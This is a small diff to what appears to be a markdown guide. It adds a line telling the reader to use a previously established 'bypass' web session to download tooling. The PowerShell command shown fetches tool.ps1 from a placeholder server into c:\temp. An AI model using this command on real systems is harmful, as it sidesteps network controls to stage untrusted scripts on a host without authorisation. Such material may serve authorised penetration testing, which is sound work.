@@ -16,6 +16,7 @@ Invoke-webrequest -Uri "https://www.google.com" -WebSession $WebSession
 ```
 
 ## Download scripts/tooling using bypass.
+If all has gone well, use the bypass to download tooling from your server location. 
 ```
 Invoke-webrequest -Method Get -Uri "https://ServerAddress/tool.ps1" -WebSession $WebSession -outfile c:\temp\tool.ps1
 ```
